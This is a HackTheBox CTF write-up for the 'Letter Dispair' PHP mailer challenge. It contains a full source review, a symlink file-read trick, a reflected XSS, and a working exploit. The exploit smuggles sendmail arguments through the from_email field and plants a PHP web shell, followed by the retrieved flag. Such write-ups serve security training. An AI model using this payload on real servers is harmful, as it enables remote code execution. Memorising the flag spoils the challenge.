---
Category:
  - Web
Difficulty: Easy
Platform: HackTheBox
Status: 3. Complete
tags:
  - RCE
  - code-review
  - php-code-injection
  - php-mail()-RCE
  - webshell
---
>[!quote]
> *A high-profile political individual was a victim of a spear-phishing attack. The email came from a legitimate government entity in a nation we don't have jurisdiction. However, we have traced the originating mail to a government webserver. Further enumeration revealed an open directory index containing a PHP mailer script we think was used to send the email. We need access to the server to read the logs and find out the actual perpetrator. Can you help?*


# Set up

- No setup available

# Information Gathering

## The application at-a-glance 🔍

Directory listing:

![Untitled](../../zzz_res/attachments/Letter%20Dispair%209f226eb88b5840a4b93efd3c2db26c14.png)

Browsed *index.nginx-debian.html*:

![Untitled](../../zzz_res/attachments/Letter%20Dispair%209f226eb88b5840a4b93efd3c2db26c14%201.png)

Browsed *mailer.php*:

![Untitled](../../zzz_res/attachments/Letter%20Dispair%209f226eb88b5840a4b93efd3c2db26c14%202.png)

## Source code review

>[!warning]
>mailer.zip contains mailer.php source code

- **mailer.php:**
    
    ```php
    <?php
    
    function not_null($value) {
        if (is_null($value)) {
          return false;
        }
    }
    
    class email
    {
    
        const IMAGE_TYPES = ['gif' => 'image/gif', 'jpg' => 'image/jpeg', 'jpeg' => 'image/jpeg', 'jpe' => 'image/jpeg', 'bmp' => 'image/bmp', 'png' => 'image/png', 'tif' => 'image/tiff', 'tiff' => 'image/tiff', 'swf' => 'application/x-shockwave-flash', ];
    
        const LINEFEEDS = ["\r\n", "\n", "\r"];
    
        const EMAIL_USE_HTML = true;
    
        protected $html;
        protected $text;
        protected $output;
        protected $html_text;
        protected $html_images = [];
        protected $build_params = [];
        protected $attachments = [];
        protected $headers = [];
        protected $lf;
    
        public function __construct($headers = [])
        {
            $this->lf = PHP_EOL;
    
            $this->build_params['html_encoding'] = 'quoted-printable';
            $this->build_params['text_encoding'] = '7bit';
            $this->build_params['html_charset'] = 'utf-8';
            $this->build_params['text_charset'] = 'utf-8';
            $this->build_params['text_wrap'] = 998;
    
            $this->headers[] = 'MIME-Version: 1.0';
            $this->headers += array_filter(array_values($headers) , 'not_null');
        }
    
        public function get_file($filename)
        {
            if ($fp = fopen($filename, 'rb'))
            {
                $return = '';
    
                while (!feof($fp))
                {
                    $return .= fread($fp, 1024);
                }
                fclose($fp);
    
                return $return;
            }
    
            return false;
        }
    
        public function find_html_images($images_dir)
        {
            $extensions = array_keys(static ::IMAGE_TYPES);
    
            preg_match_all('/"([^"]+\.(' . implode('|', $extensions) . '))"/Ui', $this->html, $images);
    
            $html_images = [];
            foreach ($images[1] as $image)
            {
                if (file_exists("$images_dir$image"))
                {
                    $html_images[] = $image;
                    $this->html = str_replace($image, basename($image) , $this->html);
                }
            }
    
            if ([] !== $html_images)
            {
                $html_images = array_unique($html_images);
                sort($html_images);
    
                foreach ($html_images as $html_image)
                {
                    if ($image = $this->get_file("$images_dir$html_image"))
                    {
                        $content_type = static ::IMAGE_TYPES[pathinfo($html_image, PATHINFO_EXTENSION) ];
                        $this->add_html_image($image, basename($html_image) , $content_type);
                    }
                }
            }
        }
    
        public function add_text($text = '')
        {
            $this->text = str_replace(static ::LINEFEEDS, $this->lf, $text);
        }
    
        public function add_html($html, $text = null, $images_dir = null)
        {
            $this->html = str_replace(static ::LINEFEEDS, '<br>', $html);
            $this->html_text = str_replace(static ::LINEFEEDS, $this->lf, $text);
    
            if (isset($images_dir))
            {
                $this->find_html_images($images_dir);
            }
        }
    
        public function add_message($email_text)
        {
            $text = strip_tags($email_text);
            if (static ::EMAIL_USE_HTML == 'true')
            {
                $this->add_html($email_text, $text);
            }
            else
            {
                $this->add_text($text);
            }
        }
    
        public function add_html_image($file, $name = '', $c_type = 'application/octet-stream')
        {
            $this->html_images[] = ['body' => $file, 'name' => $name, 'c_type' => $c_type, 'cid' => md5(uniqid(time())) , ];
        }
    
        public function add_attachment($file, $name = '', $c_type = 'application/octet-stream', $encoding = 'base64')
        {
            $this->attachments[] = ['body' => $file, 'name' => $name, 'c_type' => $c_type, 'encoding' => $encoding, ];
        }
    
        public function get_parameters($param_type, $value = null)
        {
            $params = [];
            switch ($param_type)
            {
                case 'text':
                    $params['content_type'] = 'text/plain';
                    $params['encoding'] = $this->build_params['text_encoding'];
                    $params['charset'] = $this->build_params['text_charset'];
                    return $params;
                case 'html':
                    $params['content_type'] = 'text/html';
                    $params['encoding'] = $this->build_params['html_encoding'];
                    $params['charset'] = $this->build_params['html_charset'];
                    return $params;
                case 'mixed':
                case 'alternative':
                case 'related':
                    $params['content_type'] = "multipart/$param_type";
                    return $params;
                case 'html_image':
                    $params['content_type'] = $value['c_type'];
                    $params['encoding'] = 'base64';
                    $params['disposition'] = 'inline';
                    $params['dfilename'] = $value['name'];
                    $params['cid'] = $value['cid'];
                    return $params;
                case 'attachment':
                    $params['content_type'] = $value['c_type'];
                    $params['encoding'] = $value['encoding'];
                    $params['disposition'] = 'attachment';
                    $params['dfilename'] = $value['name'];
                    return $params;
            }
    
            return false;
        }
    
        protected function _build_message()
        {
            $attachments = not_null($this->attachments);
            $html_images = not_null($this->html_images);
            $html = not_null($this->html);
            $text = not_null($this->text);
    
            $message = null;
            switch (true)
            {
                case ($text && !$attachments):
                    return new mime($this->text, $this->get_parameters('text'));
                case (!$text && $attachments && !$html):
                    return new mime('', ['content_type' => 'multipart/mixed']);
                case ($text && $attachments):
                    $message = new mime('', ['content_type' => 'multipart/mixed']);
                    $message->addSubpart($this->text, $this->get_parameters('text'));
                    return $message;
                case ($html && !$attachments && !$html_images):
                    if (not_null($this->html_text))
                    {
                        $message = new mime('', ['content_type' => 'multipart/alternative']);
                        $message->addSubpart($this->html_text, $this->get_parameters('text'));
                        $message->addSubpart($this->html, $this->get_parameters('html'));
                    }
                    else
                    {
                        $message = new mime($this->html, $this->get_parameters('html'));
                    }
                break;
                case ($html && !$attachments && $html_images):
                    if (not_null($this->html_text))
                    {
                        $message = new mime('', ['content_type' => 'multipart/alternative']);
                        $message->addSubpart($this->html_text, $this->get_parameters('text'));
                        $related = $message->addSubpart('', ['content_type' => 'multipart/related']);
                    }
                    else
                    {
                        $message = new mime('', ['content_type' => 'multipart/related']);
                        $related = $message;
                    }
                    $related->addSubpart($this->html, $this->get_parameters('html'));
                break;
                case ($html && $attachments && !$html_images):
                    $message = new mime('', ['content_type' => 'multipart/mixed']);
                    if (not_null($this->html_text))
                    {
                        $alt = $message->addSubpart('', ['content_type' => 'multipart/alternative']);
                        $alt->addSubpart($this->html_text, $this->get_parameters('text'));
                        $alt->addSubpart($this->html, $this->get_parameters('html'));
                    }
                    else
                    {
                        $message->addSubpart($this->html, $this->get_parameters('html'));
                    }
                break;
                case ($html && $attachments && $html_images):
                    $message = new mime('', ['content_type' => 'multipart/mixed']);
    
                    if (not_null($this->html_text))
                    {
                        $alt = $message->addSubpart('', ['content_type' => 'multipart/alternative']);
                        $alt->addSubpart($this->html_text, $this->get_parameters('text'));
                        $related = $alt->addSubpart('', ['content_type' => 'multipart/related']);
                    }
                    else
                    {
                        $related = $message->addSubpart('', ['content_type' => 'multipart/related']);
                    }
                    $related->addSubpart($this->html, $this->get_parameters('html'));
    
                break;
            }
    
            if ($html && $html_images)
            {
                foreach ($this->html_images as $image)
                {
                    $related->addSubpart($image['body'], $this->get_parameters('html_image', $image));
                }
            }
    
            return $message;
        }
    
        public function build_message($params = [])
        {
            foreach ($params as $key => $value)
            {
                $this->build_params[$key] = $value;
            }
    
            foreach ($this->html_images as $value)
            {
                $this->html = str_replace($value['name'], 'cid:' . $value['cid'], $this->html);
            }
    
            $message = $this->_build_message();
    
            if (is_object($message))
            {
                if (not_null($this->attachments))
                {
                    foreach ($this->attachments as $attachment)
                    {
                        $message->addSubpart($attachment['body'], $this->get_parameters('attachment', $attachment));
                    }
                }
    
                $output = $message->encode();
                $this->output = $output['body'];
    
                foreach ($output['headers'] as $key => $value)
                {
                    $headers[] = $key . ': ' . $value;
                }
    
                $this->headers = array_merge($this->headers, $headers);
    
                return true;
            }
            else
            {
                return false;
            }
        }
    
        public function normalize_headers($headers = [])
        {
            if (is_string($headers))
            {
                $headers = explode($this->lf, trim($headers));
            }
    
            $xtra_headers = [];
            foreach ($headers as $header)
            {
                if (is_array($header))
                {
                    $xtra_headers += array_filter($header);
                }
                elseif ($header)
                {
                    $xtra_headers[] = $header;
                }
            }
    
            return $xtra_headers;
        }
    
        public function format_address($address, $name = '')
        {
            return (('' == $name) ? $address : '"' . $name . '" <' . $address . '>');
        }
    
        public function send($to_name, $to_addr, $from_name, $from_addr, $subject = '', $headers = [])
        {
    
            foreach (["\n", "\r"] as $line_ending)
            {
                foreach ([$to_name, $to_addr, $subject, $from_name, $from_addr] as $header_value)
                {
                    if (false !== strstr($header_value, $line_ending))
                    {
                        return false;
                    }
                }
            }
    
            $to = $this->format_address($to_addr, $to_name);
            $from = $this->format_address($from_addr, $from_name);
    
            if (defined('EMAIL_FROM'))
            {
                $sender_headers = ['From: ' . EMAIL_FROM, 'Reply-to: ' . $from];
                $from_addr = EMAIL_FROM;
            }
            else
            {
                $sender_headers = ['From: ' . $from];
            }
    
            $headers = array_merge($this->headers, $sender_headers, $this->normalize_headers($headers));
    
            return mail($to, $subject, $this->output, implode($this->lf, $headers) , "-f$from_addr");
        }
    
    }
    
    function replace_vars($message, $email) {
        $variables = array(
            "^email^"        => $email,
            "^emailuser^"    => explode("@", $email)[0],
            "^emaildomain^"  => explode("@", $email)[1],
            "^md5^"          => md5(time()),
            "^date"          => date("d/m/Y"),
            "^time^"         => date("h:i:s a", time())
        );
    
        return strtr($message, $variables);
    }
    
    function send_email($email) {
        $mailer = new email();
        $mailer->add_message(replace_vars($_POST['email_body'], $email));
        $mailer->build_message();
    
        $from_name = $_POST['from_name'];
        $from_email = $_POST['from_email'];
        $subject = $_POST['subject'];
        $to_name = explode("@", $email)[0];
    
        if ($_FILES['attachment']['tmp_name'])
        {
            $mailer->add_attachment(
                $mailer->get_file($_FILES['attachment']['tmp_name'])
            );
        }
    
        return $mailer->send($to_name, $email, $from_name, $from_email, $subject);
    }
    
    ?>
    
    <!DOCTYPE html>
    <html lang="en">
    
    <head>
    <title>Dispair PHP Mailer</title>
    <meta name="robots" content="noindex, nofollow">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-dark-5@1.1.3/dist/css/bootstrap-night.min.css" rel="stylesheet">
    <link rel="icon" href="https://www.google.com/s2/favicons?sz=64&domain_url=hackthebox.com">
    <style>
    body {
        color: #35ce35;
        background: #0e0e0e;
        font-family: 'Ubuntu', Sans-Serif;
        font-weight: bold;
    }
    
    * {
        border-radius: 0px !important;
    }
    form label {
        padding-top: 7px;
        padding-bottom: 7px;
    }
    
    .form-control, .card {
          border: 1px solid #1c571c;
    }
    
    .card-header {
        text-transform: uppercase;
        border-bottom: 1px solid #1c571c;
    }
    
    .btn-primary {
        background: black;
        border-color: #1c571c;
        font-weight: bold;
        color: #dfdfdf;
        text-transform: uppercase;
    }
    
    .btn-primary:hover, .btn-primary:focus, .btn-primary:active {
        background: #1c571c;
    }
    
    .dstatus {
        color: white;
    }
    
    .output-card p {
        font-size: 13px;
        margin-bottom: 5px
    }
    p  > .alert-success {
        padding: 2px;
    }
    .instructions {
        background: #111;
        padding-top: 10px;
        padding-left: 10px;
    }
    </style>
    <body>
    	<div class="container mt-5 mb-5">
    		<div class="card">
    			<div class="card-header pt-3">
    				<h6>Dispair PHP Mailer</h6>
                </div>
    			<div class="card-body">
    				<div class="basic-form">
                    <form method="post" action="" enctype="multipart/form-data">
    					<div class="row">
                            <div class="row">
                                <div class="form-group col-md-6">
                                    <label for="from_email">From Email</label>
                                    <input type="text" name="from_email" class="form-control" placeholder="relations@moi.gov.htb" value="relations@moi.gov.htb"/> </div>
                                <div class="form-group col-md-6">
                                    <label for="phone">From Name</label>
                                    <input type="text" name="from_name" class="form-control" placeholder="Ministry" value="Ministry"/>
                                </div>
                            </div>
    						<div class="row mt-3">
    							<div class="form-group col">
    								<label for="address_1">Subject</label>
    								<input type="text" name="subject" class="form-control" value="" placeholder="Immediate Action Needed" /> </div>
    						</div>
    						<div class="row mt-3">
                                <div class="form-group col-md-6">
                                    <label for="email_body">Email Body</label>
    								<textarea name="email_body" class="form-control" placeholder="Type here..." rows="6">Dear ^emailuser^, ...</textarea>
    							</div>
                                <div class="col-md-6">
                                <label for="full_name">Email Variables</label>
                                <pre class="instructions">^email^ : Receiver Email (foo@bar.com)
    ^emailuser^ : Receiver Username (foo)
    ^emaildomain^ : Receiver Domain (bar.com)
    ^md5^ : Random MD5 (21232f297a57a5a743894a0e4a801fc3)
    ^date^ : Current Date (<?php echo date("d/m/Y");?>)
    ^time^ : Current Time (<?php echo date("h:i:s a", time());?>)
    </textarea>
                                </div>
                            </div>
                            <div class="row mt-3">
                                <div class="form-group col-md-6">
                                    <label for="email_list">Email List</label>
    								<textarea name="email_list" class="form-control" placeholder="foo@xyz" rows="6">foo@bar.com
    ds.cherry@moi.gov.htb</textarea>
    							</div>
                                <div class="form-group col-md-6">
                                    <label for="full_name">File Attachment</label>
                                    <input type="file" name="attachment" class="form-control" />
                                </div>
    						</div>
                            <div class="row mt-5 justify-content-center">
                                <div class="col-md-3">
                                    <button type="submit" class="btn btn-primary w-100">Start Delivery</button>
                                </div>
                            </div>
    					</div>
                    </form>
    				</div>
    				<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
                </div>
            </div>
        </div>
        <?php
        if(isset($_POST['email_list'])) {
            echo '<div class="container mt-5 mb-5"><div class="card output-card"><div class="card-body">';
            $email_list = explode(PHP_EOL,$_POST['email_list']);
            $email_count = count($email_list);
            $counter = 0;
            foreach($email_list as $email) {
                $counter += 1;
                $delivery = send_email($email);
                if ($delivery) {
                    echo '<p><span class="drank pe-5"># '.$counter.' / '.$email_count.'</span> <span class="dmail pe-5">'.$email.'</span><span class="dstatus alert-success">success</span></p>';
                }
                else {
                    echo '<p><span class="drank pe-5"># '.$counter.' / '.$email_count.'</span> <span class="dmail pe-5">'.$email.'</span><span class="dstatus alert-danger">fail</span></p>';
                }
            }
            echo '</div></div></div>';
        }
        ?>
    </body>
    
    </html>
    ```
    
- HTTP request generated by the script:
    
    ```bash
    POST /mailer.php HTTP/1.1
    Host: 206.189.125.80:31442
    Content-Length: 759
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Origin: http://206.189.125.80:31442
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydP8QDFySd8bDdxDr
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Referer: http://206.189.125.80:31442/mailer.php
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Connection: close
    
    ------WebKitFormBoundarydP8QDFySd8bDdxDr
    Content-Disposition: form-data; name="from_email"
    
    relations@moi.gov.htb
    ------WebKitFormBoundarydP8QDFySd8bDdxDr
    Content-Disposition: form-data; name="from_name"
    
    Ministry
    ------WebKitFormBoundarydP8QDFySd8bDdxDr
    Content-Disposition: form-data; name="subject"
    
    ------WebKitFormBoundarydP8QDFySd8bDdxDr
    Content-Disposition: form-data; name="email_body"
    
    Dear ^emailuser^, ...
    ------WebKitFormBoundarydP8QDFySd8bDdxDr
    Content-Disposition: form-data; name="email_list"
    
    foo@bar.com
    ds.cherry@moi.gov.htb
    ------WebKitFormBoundarydP8QDFySd8bDdxDr
    Content-Disposition: form-data; name="attachment"; filename=""
    Content-Type: application/octet-stream
    
    ------WebKitFormBoundarydP8QDFySd8bDdxDr--
    ```
    

# The Bug

## File Upload allows links

We can create arbitrary link to external files and so attach to the sent emails any file stored on the server:

```bash
$ ln -s /etc/passwd sl
```

```php
...
public function get_file($filename)
    {
        if ($fp = fopen($filename, 'rb'))
        {
            $return = '';
            while (!feof($fp))
            {
                $return .= fread($fp, 1024);
            }
            fclose($fp);
            error_log(print_r($return, TRUE));
            return $return;
        }
        return false;
    }
...
```

![Untitled](../../zzz_res/attachments/Letter%20Dispair%209f226eb88b5840a4b93efd3c2db26c14%203.png)

## Reflected XSS

![Untitled](../../zzz_res/attachments/Letter%20Dispair%209f226eb88b5840a4b93efd3c2db26c14%204.png)

![Untitled](../../zzz_res/attachments/Letter%20Dispair%209f226eb88b5840a4b93efd3c2db26c14%205.png)

## Dangerous PHP function mail()

[Why mail() is dangerous in PHP](https://blog.sonarsource.com/why-mail-is-dangerous-in-php/)

[Exploit PHP's mail() to get remote code execution - Sysadmins of the North](https://www.saotn.org/exploit-phps-mail-get-remote-code-execution/)

```php
...
public function send($to_name, $to_addr, $from_name, $from_addr, $subject = '', $headers = [])
    {
        foreach (["\n", "\r"] as $line_ending)
        {
            foreach ([$to_name, $to_addr, $subject, $from_name, $from_addr] as $header_value)
            {
                if (false !== strstr($header_value, $line_ending))
                {
                    return false;
                }
            }
        }
        $to = $this->format_address($to_addr, $to_name);
        $from = $this->format_address($from_addr, $from_name);
        if (defined('EMAIL_FROM'))
        {
            $sender_headers = ['From: ' . EMAIL_FROM, 'Reply-to: ' . $from];
            $from_addr = EMAIL_FROM;
        }
        else
        {
            $sender_headers = ['From: ' . $from];
        }
        $headers = array_merge($this->headers, $sender_headers, $this->normalize_headers($headers));
        return mail($to, $subject, $this->output, implode($this->lf, $headers) , "-f$from_addr"); # on localhost it throw an error: sh: 1: /usr/sbin/sendmail: not found
    }
}
...
```

# Exploitation

Exploited the `mail()` function and `sendmail` in order to write a custom webshell inside the root folder of the web server and thus execute arbitrary code:

```
POST /mailer.php HTTP/1.1
Host: 206.189.125.80:31442
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------261497632922261572332767290022
Content-Length: 954
Origin: http://206.189.125.80:31442
Connection: close
Referer: http://206.189.125.80:31442/mailer.php
Upgrade-Insecure-Requests: 1

-----------------------------261497632922261572332767290022
Content-Disposition: form-data; name="from_email"

relations@moi.gov.htb -OQueueDirectory=/tmp -Xrce.php
-----------------------------261497632922261572332767290022
Content-Disposition: form-data; name="from_name"

Ministry
-----------------------------261497632922261572332767290022
Content-Disposition: form-data; name="subject"

<?php system($_GET["cmd"]); ?>
-----------------------------261497632922261572332767290022
Content-Disposition: form-data; name="email_body"

Dear ^emailuser^, ...
-----------------------------261497632922261572332767290022
Content-Disposition: form-data; name="email_list"

foo@bar.com
ds.cherry@moi.gov.htb
-----------------------------261497632922261572332767290022
Content-Disposition: form-data; name="attachment"; filename=""
Content-Type: application/octet-stream

-----------------------------261497632922261572332767290022--
```

![Untitled](../../zzz_res/attachments/Letter%20Dispair%209f226eb88b5840a4b93efd3c2db26c14%206.png)

`http://206.189.125.80:31442/rce.php?cmd=cat+/flag.txt`

![Untitled](../../zzz_res/attachments/Letter%20Dispair%209f226eb88b5840a4b93efd3c2db26c14%207.png)

# Flag

>[!success]
>`HTB{4_l3tt3r_0f_h0p3_c0nqu3r1ng_d1sp4ir!}`
>
